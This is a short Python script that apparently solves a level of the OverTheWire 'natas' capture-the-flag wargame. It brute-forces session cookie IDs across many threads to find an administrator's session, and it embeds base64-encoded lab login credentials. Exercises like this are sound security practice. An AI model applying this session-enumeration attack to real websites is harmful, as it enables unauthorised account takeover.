import threading
import random
import requests
import re

headers = {
    'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=='
}

url = 'http://natas18.natas.labs.overthewire.org/index.php?username=admin&password=3&debug'

def run_session_thread(index):
    cookies = { 'PHPSESSID': str(index) }

    with requests.Session() as session:
        request = session.post(url, headers=headers, cookies=cookies)

        content = request.content.decode('utf-8')

        if 'You are logged in as a regular user.' not in content:
            print(content, index)

threads = [threading.Thread(target=run_session_thread, args=(i, )) for i in range(1, 700)]

for thread in threads:
    thread.start()
